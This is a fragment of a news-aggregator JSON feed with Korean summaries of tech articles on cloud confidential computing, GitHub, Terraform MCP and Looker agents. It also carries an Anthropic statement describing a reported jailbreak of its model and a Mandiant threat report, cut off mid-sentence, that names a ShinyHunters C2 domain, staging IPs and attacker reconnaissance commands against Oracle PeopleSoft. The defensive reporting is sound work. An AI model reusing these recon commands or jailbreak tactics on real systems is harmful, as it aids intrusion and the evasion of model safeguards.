+    "aiSummary": "Google Cloud는 Apple과 협력하여 Apple의 Private Cloud Compute 시스템을 Google Cloud 인프라에서 운영할 수 있도록 지원합니다. 이번 협력은 Apple이 추구하는 엄격한 보안, 기밀성, 투명성 기준을 충족하기 위해 진행되었으며 Intel 및 NVIDIA와도 긴밀하게 연계되었습니다.\n\nGoogle Cloud는 자사의 Titanium 보안 아키텍처와 Titan 칩을 활용하여 하드웨어 기반의 신뢰 루트를 구축합니다. 특히 Confidential Computing 포트폴리오를 통해 데이터가 저장 중이거나 전송 중일 때뿐만 아니라 사용 중일 때도 하드웨어 기반 Trusted Execution Environments 내에서 암호화되도록 보호합니다.\n\nApple의 Private Cloud Compute를 지원하기 위한 핵심 기술로는 Intel TDX와 NVIDIA Confidential Computing이 포함됩니다. 이를 통해 고성능 AI 추론 과정에서 CPU부터 GPU까지 이어지는 전체 컴퓨팅 경로를 보호하며 가상 머신에 대한 하드웨어 기반 격리 환경을 제공합니다.\n\n또한 양사는 투명성 확보를 위해 호스트 스택을 오픈 소스로 공개하여 시스템의 보안 속성을 독립적으로 검사하고 검증할 수 있도록 했습니다. 이러한 협력을 통해 구축된 안전한 인프라와 기술 표준은 향후 모든 Google Cloud 고객이 민감한 데이터를 처리하는 AI 워크로드를 운영할 때 더욱 신뢰할 수 있는 환경을 제공하는 데 기여할 예정입니다.",
+    "cleanContent": "At Google Cloud, we’re committed to providing the most advanced, secure, and private infrastructure for the most demanding AI workloads, and partnering with a broad and diverse range of organizations to help them meet their AI workload needs.\nWe are thrilled to collaborate with Apple on its expanded Private Cloud Compute (PCC) systems announced this week at WWDC 2026. Working closely together, Apple and Google have built a serving platform on Google Cloud that meets the rigorous security, confidentiality, and transparency goals that Apple has for PCC. This achievement is a testament to the strong collaboration between our teams, as well as with Intel and NVIDIA.\nOur commitment to privacy with Confidential Computing\nOur collaboration with Apple is built on a foundation of deep commitment to privacy that leverages Google Cloud's security and privacy technologies. At the heart of this collaboration is our Confidential Computing portfolio and our Titanium security architecture.\nTitanium architecture, featuring our custom-designed Titan chip, provides a hardware root of trust that underpins the security and integrity of Google's infrastructure and services. Confidential Computing builds on this secure foundation by helping ensure data is protected throughout the lifecycle, encrypted at rest, in transit, and crucially in use within hardware-based Trusted Execution Environments (TEEs).\nBy protecting data in use, Confidential Computing becomes a fundamental and foundational element for building trust in AI systems, providing verifiable integrity and isolation for sensitive workloads. Confidential Computing helps prevent unauthorized access because data remains encrypted and isolated.\nEnabling Apple Private Cloud Compute on Google Cloud\nWe are proud to collaborate with Apple to extend the privacy and security properties of PCC infrastructure to Google Cloud. Our platform supports Apple’s PCC privacy commitments with a layered security approach built upon Google Cloud’s infrastructure, including:\n\nGoogle Cloud Confidential Computing: Our core Confidential Computing platform provides the hardware-based TEEs necessary for PCC. By leveraging Intel TDX (Trust Domain Extensions) and NVIDIA Confidential Computing, we provide hardware-based isolation for virtual machines, designed to create a highly secure and private environment where workloads can run with cryptographic assurances.\nGoogle Titanium security architecture and Titan chip: Google Titan chips are a key component in powering security and transparency posture for PCC infrastructure on Google Cloud. Deployed across our fleet, Titan establishes a strong hardware root of trust, helping to ensure the integrity of the boot process and the hardware platform itself.\nIntel TDX and NVIDIA Confidential Computing: Google Cloud leverages the security features on Intel CPUs and NVIDIA Blackwell GPUs to protect data-in-use during high-performance AI inference, helping ensure that the entire compute path – from CPU to GPU – is protected.\nOpen-source transparency: With our commitment to verifiable security, Apple and Google have collaborated in engineering an open-source host stack specifically to support PCC's transparency, enabling independent inspection and verification of the system's security properties.\n\nTogether, these technologies help ensure that Apple PCC on Google Cloud meets requirements with enforceable protections, no privileged runtime access, and verifiable transparency.\nBuilding the future of private AI infrastructure\nOur collaboration with Apple represents a significant milestone in further strengthening a secure cloud for AI by building on technologies and standards from Apple, Google Cloud, Intel, and NVIDIA. By ensuring that every layer of the stack — both hardware and software — contributes to a verifiable and secure system, we’ve created an advanced platform that is designed to uphold the stringent standards of user privacy and data security that PCC architecture demands.\nThe advancements built through this collaboration will benefit all Google Cloud customers. We are committed to continuous improvement and offering more transparent, secure, resilient platforms for all types of workloads, especially those handling AI and sensitive data.\nYou can learn more about Confidential Computing here.",
+    "url": "https://cloud.google.com/blog/products/identity-security/powering-the-next-era-of-confidential-ai/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Amit Patil"
+      ],
+      "title": [
+        "Sr. Director, Engineering, Google Cloud"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Thu, 11 Jun 2026 19:30:00 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-10-bot-created-pull-requests-can-run-workflows-if-approved",
+    "title": "Bot-created pull requests can run workflows if approved",
+    "summary": "Pull requests created by the github-actions[bot] are now able to run your CI/CD workflows with user approval. Requiring approval is a security measure to ensure generated code does not automatically…\n",
+    "aiSummary": "GitHub에서 github-actions[bot]이 생성한 Pull request가 사용자의 승인을 거쳐 CI/CD 워크플로우를 실행할 수 있도록 기능이 변경되었습니다.\n\n이는 자동 생성된 코드가 검증 없이 자동으로 실행되는 것을 방지하기 위한 보안 조치입니다. 이제 개발자는 봇이 작성한 코드 변경 사항을 직접 검토하고 승인함으로써 보안성을 유지하면서도 워크플로우의 자동화 효율성을 높일 수 있습니다.",
+    "cleanContent": "Pull requests created by the github-actions[bot] are now able to run your CI/CD workflows with user approval. Requiring approval is a security measure to ensure generated code does not automatically…\nThe post Bot-created pull requests can run workflows if approved appeared first on The GitHub Blog.",
+    "url": "https://github.blog/changelog/2026-06-11-bot-created-pull-requests-can-run-workflows-if-approved",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 11 Jun 2026 19:00:56 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-11-ai-usage-report-updates",
+    "title": "AI usage report updates",
+    "summary": "Your AI usage reports now reflect GitHub AI Credits usage in the standard report fields. To monitor AI credit usage going forward, use quantity for AI credit quantity and gross_amount…\nThe post AI usa",
+    "aiSummary": "GitHub의 AI 사용량 보고서 기능이 업데이트되었습니다. 이제 표준 보고서 필드에서 GitHub AI Credits 사용 내역을 직접 확인할 수 있습니다. 향후 AI 크레딧 사용량을 추적하기 위해서는 보고서의 quantity 필드와 gross_amount 필드를 참조하면 됩니다.",
+    "cleanContent": "Your AI usage reports now reflect GitHub AI Credits usage in the standard report fields. To monitor AI credit usage going forward, use quantity for AI credit quantity and gross_amount…\nThe post AI usage report updates appeared first on The GitHub Blog.",
+    "url": "https://github.blog/changelog/2026-06-11-ai-usage-report-updates",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 11 Jun 2026 18:27:05 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://www.hashicorp.com/blog/terraform-mcp-server-is-now-generally-available",
+    "title": "Terraform MCP server is now generally available",
+    "summary": "Terraform MCP server enables AI assistants like GitHub Copilot, IBM Bob, Claude Code  etc. to interact with Terraform through the Model Context Protocol (MCP). By connecting AI to your infrastructure ",
+    "aiSummary": "HashiCorp에서 개발한 Terraform MCP server가 정식 출시되었습니다. 이 기술은 GitHub Copilot, IBM Bob, Claude Code 등 MCP를 지원하는 AI 어시스턴트가 Terraform 워크플로우와 직접 상호작용할 수 있도록 연결합니다.\n\n이번 업데이트를 통해 엔지니어들은 인프라 운영 과정에서 겪던 반복적인 업무 부담을 획기적으로 줄일 수 있게 되었습니다. AI 어시스턴트는 조직의 private registry에 직접 접근하여 승인된 모듈을 검색하고 표준화된 코드를 자동으로 생성함으로써, 수동 작업으로 인한 오류와 일관성 없는 인프라 구성을 방지합니다.\n\n또한 Terraform MCP server는 복잡한 워크스페이스 데이터를 통합하여 AI가 즉각적인 상태 분석과 질의응답을 수행하도록 지원합니다. 특히 난해한 Terraform plan 결과를 자연어로 분석하고 설명해주어 코드 리뷰 효율을 높여줍니다.\n\n보안 측면에서는 기존의 Terraform 인증 및 권한 모델을 그대로 유지하며, AI 어시스턴트가 최소한의 데이터만 처리하도록 설계되었습니다. 또한 CORS 정책, 속도 제한, OpenTelemetry 연동을 통해 모니터링과 보안 감사가 가능합니다.\n\n해당 서버는 로컬 개발자 환경이나 중앙 집중식 공유 서비스 형태로 유연하게 배포할 수 있습니다. HCP Terraform과 Terraform Enterprise 사용자 모두 이용 가능하며, GitHub 리포지토리나 공식 문서를 통해 설정을 시작할 수 있습니다.",
+    "cleanContent": "Terraform MCP server enables AI assistants like GitHub Copilot, IBM Bob, Claude Code  etc. to interact with Terraform through the Model Context Protocol (MCP). By connecting AI to your infrastructure workflows, teams reduce manual effort, eliminate context switching between tools, and accelerate delivery without compromising security.\nToday, we're announcing the general availability of Terraform MCP server, now available for both HCP Terraform and Terraform Enterprise. This represents a milestone shaped by customer and community feedback since we first announced Terraform MCP server last year. In this post, we'll explore how Terraform MCP server improves infrastructure team productivity through AI-assisted workflows, maintains security by design, and provides flexible deployment options for teams of any size.\nAccelerate infrastructure workflows with AI\nTeams previously spent significant time on repetitive tasks: searching documentation, interpreting plan files, and auditing configurations. Terraform MCP server shifts this burden to AI assistants, allowing engineers to focus on strategic work rather than routine operations.\nGenerate code using your organization's standards\nBefore, engineers manually searched private registries for approved modules, copied examples, and verified compliance with organizational policies. This process was time-consuming and error-prone, often resulting in inconsistent infrastructure patterns across teams.\nNow, AI assistants can connect directly to your Terraform or Terraform Enterprise private registry. They discover approved modules, understand your organization's patterns, and generate compliant code automatically. This eliminates the need to manually search modules and ensures consistent infrastructure across your organization, reducing both development time and compliance risk.\nAccess Terraform workspace data and configurations\nManaging infrastructure across multiple workspaces requires constant context switching between tools and interfaces. Traditionally, engineers navigate through web UIs or CLI commands to gather information about workspace configurations and variables, a fragmented workflow that slows down troubleshooting and decision-making.\nTerraform MCP server provides AI assistants with direct access to workspace data and configurations. Users can ask questions like \"Which workspaces haven't been updated in 90 days?\" or \"Show me workspaces managing more than 1,000 resources,\" and receive immediate answers. This unified access eliminates context switching, enabling teams to gain faster insights and make informed decisions without leaving their development environment.\nUnderstand plan changes with context\nTerraform plan output can be difficult to interpret, especially for complex infrastructure changes. Engineers have traditionally spent time manually parsing plan files, tracing resource dependencies, and assessing the impact of modifications before approval.\nTerraform MCP server now enables AI assistants to analyze plan details and explain changes in natural language. This reduces the risk of misinterpreting plans and speeds up code review cycles, helping teams move faster while maintaining confidence in their infrastructure changes.\nSecurity by design\nFor infrastructure teams, security is non-negotiable. Terraform MCP server acts as a controlled interface that enforces your existing Terraform authentication and authorization. AI assistants receive only the specific information needed to answer questions, and not the credentials or sensitive data, reducing the risk of exposure while maintaining the security boundaries you've already established. The server includes CORS policies, rate limiting, and OpenTelemetry integration for monitoring and security auditing.\nFlexible deployment options\nTerraform MCP server supports deployment modes that fit how your team works. For individual developers, local execution provides the fastest setup and keeps all data on your machine, ideal for personal development and testing. For teams requiring centralized management, the server can be deployed as a shared service that team members access remotely while maintaining individual access controls through their own Terraform tokens.\nBoth deployment modes enforce the same authentication model, credentials remain in the deployment environment, while AI assistants receive only necessary metadata and configuration data needed to respond to queries.\nGet started with Terraform MCP server\nTerraform MCP server works with multiple AI assistants, including IBM Bob, Claude Desktop, GitHub Copilot, and other MCP-compatible tools. To get started:\n·      Read the documentation on setting up the MCP server.\n·      View the private registry tutorial\n·      Go to the GitHub repo\nNew to Terraform? Sign up for an HCP account to get started today and check out our tutorials. HCP Terraform includes a $500 credit that allows users to quickly get started using features from any plan, including HCP Terraform Premium. Contact our sales team if you’re interested in trying our self-managed offering: Terraform Enterprise.",
+    "url": "https://www.hashicorp.com/blog/terraform-mcp-server-is-now-generally-available",
+    "category": "클라우드 & 인프라",
+    "source": "Terraform Blog",
+    "author": "Vishnu Ravindra",
+    "pubDate": "2026-06-11T18:00:00.000Z",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "Terraform",
+      "IaC"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/business-intelligence/dashboard-agents-in-looker/",
+    "title": "Transform dashboards into interactive data experiences with Looker agents",
+    "summary": "Dashboards have long served as a primary way for organizations to extract insights from data, but they can fall short in agile environments: Dashboards aren’t interactive and don’t allow you to ask fo",
+    "aiSummary": "Google Cloud는 기존의 정적인 대시보드가 가진 한계를 극복하기 위해 Looker dashboard agents를 프리뷰 버전으로 공개합니다. 사용자는 Gemini 아이콘을 클릭하여 자연어로 질문을 던질 수 있으며, 대시보드 내에 내장된 지능형 에이전트가 문맥을 파악해 실시간으로 답변과 시각화 자료를 제공합니다.\n\nLooker dashboard agents는 대시보드에 적용된 필터와 교차 필터, 기존 타일 정보를 직접 참조하여 복잡한 비즈니스 질문에 대해 정확한 분석 결과를 도출합니다. 데이터 분석가는 시맨틱 레이어 상단에 자연어 지침을 추가하여 에이전트가 기업 고유의 비즈니스 로직을 올바르게 해석하도록 세밀하게 구성할 수 있습니다. 이를 통해 분석가 팀의 업무 부담을 줄이고 사용자가 직접 데이터를 탐색하는 셀프 서비스 분석 환경을 지원합니다.\n\n시스템에 대한 신뢰성을 확보하기 위해 에이전트는 답변 도출 과정에서의 추론 단계와 참조한 데이터 소스, 적용된 필터 등을 투명하게 공개합니다. 또한 Looker의 기존 거버넌스 모델 및 권한 관리 체계를 그대로 계승하여 허가된 사용자만 데이터에 접근할 수 있도록 설계되었습니다.\n\nLooker 26.08.11 버전 이상부터 관리자 설정에서 Gemini in Looker 기능을 활성화하여 사용할 수 있으며, 향후 iframe 임베딩 지원 등을 통해 외부 포털이나 애플리케이션으로 확장될 예정입니다.",
+    "cleanContent": "Dashboards have long served as a primary way for organizations to extract insights from data, but they can fall short in agile environments: Dashboards aren’t interactive and don’t allow you to ask follow-up questions. This forces users to step outside their workflows or turn to data analysts to get the answers they need. Today, we are introducing Looker dashboard agents in preview, embedding intelligent, conversational data agents directly within dashboards and empowering users to explore their business intelligence (BI) data using natural language.\n\n\n\n\n\n\n\n\n  \n    \nStart a conversation with a Looker dashboard agent\n\n      \n    \n\n  \n      \nInteractive agent-led investigations\nTraditionally, dashboards have presented a static view of data. With dashboard agents in Looker, users can explore their data directly within the dashboard interface. Users can start a conversation by clicking the Gemini icon and asking natural-language questions to receive contextual insights.\nThe accuracy of a data agent depends on the business context it is provided, and its ability to map appropriate metrics and dimensions to users’ inquiries. The Looker dashboard agent has direct context about the user’s applied filters, cross-filters, and pre-curated tiles, helping it to generate highly relevant and accurate answers to complex business questions.\nShould a query require more data, the agent can access underlying Explores to uncover additional information. These insights are paired with relevant charts and natural language explanations to simplify data exploration.\n\n\n\n\n\n\n\n\n  \n    \nExplore data beyond dashboard to uncover deeper insights\n\n      \n    \n\n  \n      \nTailor the agent to your business \nData analysts curate dashboards to provide business users with precise perspectives on organizational data. To maintain this kind of consistent and reliable analytical environment, the Looker dashboard agent is highly configurable. Analysts can add context on top of the Looker semantic layer by providing natural-language instructions directly to the agent. This way, they can define exactly how the agent interprets unique business logic and tailors responses for the target audience. By enabling self-serve data analysis, dashboard agents help analyst teams scale to meet the increasing data demands of the business.\n\n\n\n\n\n\n\n\n  \n    \nConfigure Looker dashboard agents\n\n      \n    \n\n  \n      \nInherited trust and transparency \nFor users to adopt an AI-based system, they must trust the information it provides them. When generating an insight, the Looker dashboard agent explicitly shows its work by displaying intermediate reasoning, referenced dashboard tiles, and applied filters. Additionally, the administrator needs to trust users only have access to data and insights to which they are authorized. The dashboard agent is backed by Looker’s governance model, managed through standard permissions.\nWe are actively working on additional capabilities for the Looker dashboard agent, including support for iframe embedding, allowing organizations to bring dashboard agents alongside Looker dashboards into any essential portal or application.\nEnable dashboard agents today\nWith Looker version 26.08.11 and later, administrators can activate the dashboard agent capability by toggling \"Enable Chat with Dashboard\" within the Gemini in Looker settings. Once enabled, authorized users will see the Gemini icon and can begin chatting with their dashboard data immediately. Please explore our support documentation for more detailed information.",
+    "url": "https://cloud.google.com/blog/products/business-intelligence/dashboard-agents-in-looker/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Vaibhavi Sonavane"
+      ],
+      "title": [
+        "Product Manager"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Thu, 11 Jun 2026 16:00:00 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://www.anthropic.com/news/fable-mythos-access",
+    "title": "Statement on the US government directive to suspend access to Fable 5 and Mythos 5",
+    "summary": "ResearchPolicyCommitmentsLearnNewsTry ClaudeAnnouncementsStatement on the US government directive to suspend access to Fable 5 and Mythos 5Jun 12, 2026The US government, citing national security autho",
+    "aiSummary": "미국 정부는 국가 안보를 이유로 Anthropic의 AI 모델인 Fable 5와 Mythos 5에 대한 모든 외국인의 접근을 즉각 중단하라는 수출 통제 지침을 발표했습니다. 이에 따라 Anthropic은 해당 모델에 대한 고객의 접근을 즉시 차단했습니다.\n\nAnthropic 측은 정부가 지목한 보안 우려 사항이 특정 코드베이스의 소프트웨어 결함을 수정하도록 하는 수준의 단순한 잠재적 우회 기술에 불과하며, 이는 OpenAI의 GPT-5.5를 비롯한 다른 공개 모델에서도 이미 가능한 보편적인 기능이라고 반박했습니다.\n\nAnthropic은 이번 정부 조치가 기술적 사실에 근거하지 않았으며, 동일한 기준을 적용할 경우 업계 전반의 모든 차세대 모델 배포가 중단될 것이라고 지적했습니다. 해당 기업은 이번 지침이 오해에서 비롯되었다고 판단하여 조속한 서비스 복구를 위해 노력하고 있으며, 향후 24시간 내에 상세 내용을 추가로 공유할 예정입니다.",
+    "cleanContent": "ResearchPolicyCommitmentsLearnNewsTry ClaudeAnnouncementsStatement on the US government directive to suspend access to Fable 5 and Mythos 5Jun 12, 2026The US government, citing national security authorities, has issued an export control directive to suspend all access to Fable 5 and Mythos 5 by any foreign national, whether inside or outside the United States, including foreign national Anthropic employees. The net effect of this order is that we must abruptly disable Fable 5 and Mythos 5 for all our customers to ensure compliance. Access to all other Anthropic models will not be affected. We received the directive from the government today at 5:21pm (ET). The letter did not provide specific details of its national security concern. Our understanding is that the government believes it has become aware of a method of bypassing, or “jailbreaking” Fable 5. We reviewed a demonstration of this specific technique being used to identify a small number of previously known, minor vulnerabilities. These vulnerabilities all appear relatively simple, and we have found that other publicly-available models are able to discover them as well without requiring a bypass. Anthropic’s posture with respect to Fable’s safeguards, as laid out in our launch blog post, is the following: To date, the government has only given us verbal evidence of a potential narrow, non-universal jailbreak, which essentially consists of asking the model to read a specific codebase and fix any software flaws. Our understanding is that one potential jailbreak was shared with the government. We have reviewed a report that we believe is the basis of the government&#x27;s directive and validated that the level of capability displayed there is widely available from other models (including OpenAI’s GPT-5.5), and is used every day by the defenders who keep systems safe. We will share more details over the next 24 hours. We are complying with the government’s legal directive and are removing access to Fable 5 and Mythos 5 for all users. However, we disagree that the finding of a narrow potential jailbreak should be cause for recalling a commercial model deployed to hundreds of millions of people. If this standard was applied across the industry, we believe it would essentially halt all new model deployments for all frontier model providers. As we have stated publicly, we believe the government should have the ability to block unsafe deployments, as part of a statutory process that is transparent, fair, clear, and grounded in technical facts. This action does not adhere to those principles. We apologize for this disruption to our customers. We believe this is a misunderstanding and are working to restore access as soon as possible. Related contentResults from the first Anthropic Public RecordRead moreTCS and Anthropic partner to bring Claude to regulated industriesWe’re announcing a partnership with Tata Consultancy Services (TCS). TCS will provide Claude to 50,000 of its own employees across 56 c",
+    "url": "https://www.anthropic.com/news/fable-mythos-access",
+    "category": "인공지능",
+    "source": "Anthropic News",
+    "author": "Anthropic",
+    "pubDate": "2026-06-11T15:00:00.000Z",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Anthropic",
+      "Claude",
+      "AI",
+      "LLM"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/laracon-us-2026-reveals-its-full-speaker-lineup",
+    "title": "Laracon US 2026 Reveals Its Full Speaker Lineup",
+    "summary": "Laracon US 2026 has announced its complete speaker lineup for July 28-29 in Boston, headlined by Taylor Otwell, Aaron Francis, Nuno Maduro, and Kent C. Dodds.\nThe post Laracon US 2026 Reveals Its Full",
+    "aiSummary": "오는 7월 28일부터 29일까지 보스턴에서 개최되는 Laracon US 2026의 전체 연사 라인업이 공개되었습니다. 이번 행사는 Laravel의 창시자인 Taylor Otwell을 비롯하여 Aaron Francis, Nuno Maduro, Kent C. Dodds가 주요 연사로 참여하여 자리를 빛낼 예정입니다.",
+    "cleanContent": "Laracon US 2026 has announced its complete speaker lineup for July 28-29 in Boston, headlined by Taylor Otwell, Aaron Francis, Nuno Maduro, and Kent C. Dodds.\nThe post Laracon US 2026 Reveals Its Full Speaker Lineup appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
+    "url": "https://laravel-news.com/laracon-us-2026-reveals-its-full-speaker-lineup?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Eric L. Barnes",
+    "pubDate": "Thu, 11 Jun 2026 14:48:54 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/the-state-of-php-2026-survey-is-now-open",
+    "title": "The State of PHP 2026 Survey Is Now Open",
+    "summary": "JetBrains and The PHP Foundation have launched the first State of PHP survey, gathering data on how PHP developers work, what tools they use, and where the language should go next.\nThe post The State ",
+    "aiSummary": "JetBrains와 The PHP Foundation이 PHP 개발자들의 업무 환경과 도구 활용 현황, 그리고 향후 언어의 발전 방향을 파악하기 위해 State of PHP 2026 설문 조사를 시작합니다. 이번 설문은 PHP 생태계의 전반적인 동향을 분석하는 첫 번째 프로젝트로, 전 세계 PHP 개발자들의 의견을 수렴하여 언어의 미래를 결정하는 데 활용될 예정입니다. 관심 있는 개발자들은 공식 설문을 통해 관련 데이터 수집에 참여할 수 있습니다.",
+    "cleanContent": "JetBrains and The PHP Foundation have launched the first State of PHP survey, gathering data on how PHP developers work, what tools they use, and where the language should go next.\nThe post The State of PHP 2026 Survey Is Now Open appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
+    "url": "https://laravel-news.com/the-state-of-php-2026-survey-is-now-open?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Eric L. Barnes",
+    "pubDate": "Thu, 11 Jun 2026 14:21:19 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/",
+    "title": "ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit",
+    "summary": "Introduction\nMandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft applicati",
+    "aiSummary": "Mandiant와 Google Threat Intelligence Group은 UNC6240으로 알려진 위협 행위자 ShinyHunters가 Oracle PeopleSoft의 취약점인 CVE-2026-35273을 악용하여 교육 분야를 중심으로 공격을 감행한 사실을 확인했습니다. CVSS 점수 9.8의 원격 코드 실행 취약점을 이용한 이번 공격은 Oracle의 보안 권고 이전부터 제로데이 형태로 수행되었으며, 주로 고등 교육 기관을 표적으로 삼았습니다.\n\n공격자들은 PSEMHUB 엔드포인트를 통해 침투한 뒤 MeshCentral 원격 관리 도구를 배포하고 정상적인 Microsoft Azure 서비스인 것처럼 위장하여 명령 및 제어 서버를 운영했습니다. 이후 정찰 활동을 통해 시스템 내부 정보를 수집하고 사용자 지정 스크립트를 활용하여 횡적 이동을 시도했으며, 탈취된 데이터는 ShinyHunters의 데이터 유출 사이트에 공개되었습니다.\n\n이번 공격에 대응하기 위해 Oracle PeopleSoft 운영 조직은 외부망에서 PSEMHUB 및 PSIGW 엔드포인트로의 접근을 즉시 차단해야 합니다. 또한 웹 서버의 접근 로그를 분석하여 의심스러운 요청을 확인하고, 시스템 파일 내에 포함된 웹쉘이나 비정상적인 XML 설정 파일이 존재하는지 점검해야 합니다. 추가적으로 외부로 향하는 SMB 트래픽을 모니터링하여 추가적인 공격 시도를 방지할 것을 권장합니다.",
+    "cleanContent": "Introduction\nMandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft application infrastructure. The activity was observed between May 27, 2026, and June 9, 2026 and is consistent with the exploitation of CVE-2026-35273, a critical remote code execution vulnerability (CVSS 9.8) in the Environment Management component. The exploitation of this vulnerability directly aligns with the observed targeting of Environment Management Hub (PSEMHUB) endpoints. Because this activity predates Oracle's June 10, 2026 advisory, the vulnerability was exploited as a zero-day.\nUpon becoming aware of active scanning and exploitation, we initiated notifications to over 100 global organizations whose IP addresses correlated with potentially vulnerable endpoints. Most of these organizations were based in the United States, and 68 percent operated within the higher education sector. Subsequently, public reports by @nahamike01 on X highlighted open attacker directories on the staging servers, allowing GTIG to perform a detailed triage of the threat actor's operations. \nThe attacker staging environments hosted customized MeshCentral agents masquerading as legitimate cloud endpoints, which they used to run administrative command queries and deploy a custom lateral movement and defacement script, [victim_abbreviation]_fanout.sh. This campaign directly correlates with subsequent data leaks of stolen organization data published on the ShinyHunters Data Leak Site (DLS) on June 9, 2026. \nWe recommend that organizations running Oracle PeopleSoft take the following immediate actions to best defend themselves. Additional remediation and hardening guidance is included later in this post.\n\n\n    aside_block\n    ), ('btn_text', ''), ('href', ''), ('image', None)])]>\n\nThreat Detail & Campaign Overview\nOn June 9 2026, public threat reports highlighted open attacker directories. GTIG triaged five sequential IP addresses: 142.11.200.186, 142.11.200.187, 142.11.200.188, 142.11.200.189, and 142.11.200.190. These systems were hosting Python SimpleHTTP servers on port 8888, exposing directory contents that included staging materials, customized agents, and attacker command histories.\nThe staging infrastructure hosted pre-configured Windows MeshCentral agent binaries disguised as Microsoft Azure services, specifically named meshagent32-azure-ops.exe, meshagent64-azure-ops.exe, and meshagent64-v2.exe. MeshCentral is an open-source remote management server; its agent is software that runs on remote devices to allow for remote management across various operating systems, including Windows, Linux, macOS, and FreeBSD. Static analysis indicates these agents were hardcoded to establish communication with the command and control (C2) server wss://azurenetfiles.net:443/agent.ashx. The domain azurenetfiles.net was chosen to mimic legitimate Microsoft Azure NetApp Files endpoints, a common masquerading tactic. An unconfigured Linux meshagent binary was also staged, suggesting that the threat actors passed parameters dynamically via the command line during deployment.\nGlobal Notification Response Campaign\nPrior to the discovery of the open staging directories, we began an effort to alert over 100 exposed organizations to assist in restricting access to vulnerable endpoints. These organizations are significantly concentrated in the Higher Education sector; 68 percent are academic institutions, including universities and colleges worldwide.\nWhile several organizations successfully blocked the activity or remediated the vulnerabilities, others experienced compromise, resulting in stolen data being published on the ShinyHunters DLS.\nTechnical Analysis & Command History\nThe exposed .bash_history file, which was identical across all five staging hosts, outlines the server configuration and administrative actions. The technical narrative begins with the configuration of the staging environment. On May 27, 2026, at 22:14 UTC, the attackers installed the MeshCentral remote management server (version 1.1.59) to establish their C2 staging environment. Shortly after, at 22:25 UTC, they installed the acme-client npm package to automate the provisioning of Let's Encrypt SSL certificates for the masquerading domain \"azurenetfiles.net\".  The attackers interacted with compromised systems using the MeshCentral command-line interface utility meshctrl.js.\nThe command history shows the threat actors performing targeted reconnaissance within compromised internal networks. They mapped Oracle PeopleSoft configurations by inspecting mount points, checking the process scheduler configuration file psappsrv.cfg, and reading WebLogic server XML configurations (config.xml). The session log ends with the attackers establishing an outbound SSH connection from their staging system to 176.120.22.24, which hosts the public clearnet mirror of the ShinyHunters DLS.\nAn analysis of the exposed command history reveals the key administrative and malicious operations performed by the threat actors on the staging servers (timestamps were not available in every case):\n1. Staging Infrastructure Setup:\nMay 27, 2026, 22:14 UTC: Installed MeshCentral (v1.1.59) and 22:25 UTC: Installed \"acme-client\" to establish the C2 staging environment and automate SSL certificate provisioning for azurenetfiles.net.\nStaged the compiled Windows agent binaries (meshagent32-azure-ops.exe, etc.) designed to communicate back to the C2 address: wss://azurenetfiles.net:443/agent.ashx.\nMay 29, 2026, 18:46 UTC: The attackers checked for the availability of the \"authenticode\" tool on the staging system using the command npm list global authenticode. This command would return any npm package with a name starting in 'authenticode', such as authenticode-sign, used for signing binaries, or authenticode, used for examining metadata on a file.\n2. Targeted Internal Reconnaissance:\nLeveraged the MeshCentral CLI utility meshctrl.js to execute administrative command queries on compromised remote endpoints: hostname; id.\nMapped Oracle PeopleSoft system configurations by inspecting the process scheduler configuration file (psappsrv.cfg) to extract machine names and IP addresses:\n\n\ngrep -hE '\\''^[[:space:]]*Address=|^[[:space:]]*HostName='\\'' /u01/app/psoft/ps_config_homes/csprd/appserv/prcs/psappsrv.cfg 2>/dev/null | head -80\n\n\nAudited network configurations and active mounts on compromised hosts: mount | grep -E \"psoft|ps_config|nfs\".\nMapped internal subnet hosts by querying local hosts tables: cat 